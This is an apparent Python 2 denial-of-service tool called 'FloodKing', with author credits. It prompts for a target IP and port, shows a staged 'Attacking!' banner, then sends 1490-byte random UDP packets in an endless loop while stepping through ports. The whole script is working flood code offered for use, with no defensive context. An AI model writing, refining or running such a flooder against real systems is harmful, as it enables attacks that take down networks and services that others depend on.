#modules required
import sys
import os
import time
import socket
import random

#Coding time part
from datetime import datetime #to calculate time taken
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#socket coding
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


os.system("clear")
print("\033[1;32;40m")
os.system("figlet FloodKing")
print("\033[1;34;40m[\033[1;31;40m+\033[1;34;40m] \033[1;31;40mAuthor : b3tar00t ")
print(" ")
print("\033[1;34;40m[\033[1;31;40m+\033[1;34;40m] \033[1;31;40mGithub : https://github.com/b3tar00t")
print(" ")
print("\033[1;34;40m[\033[1;31;40m+\033[1;34;40m] \033[1;31;40mInstagram : @b3ta_r00t")
print(" ")

ip = raw_input("\033[1;36;40mEnter Target IP : ")
port = input("\033[1;36;40mEnter Target Port : ")

os.system("clear")
print("\033[1;31;40m")
os.system("figlet Attacking!")
print("[0%]")
time.sleep(5)
print("")
print("[25%]")
time.sleep(5)
print("")
print("[50%]")
time.sleep(5)
print("")
print("[75%]")
time.sleep(5)
print("")
print("[100%]")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s Packet to %s through Port : %s"%(sent,ip,port))
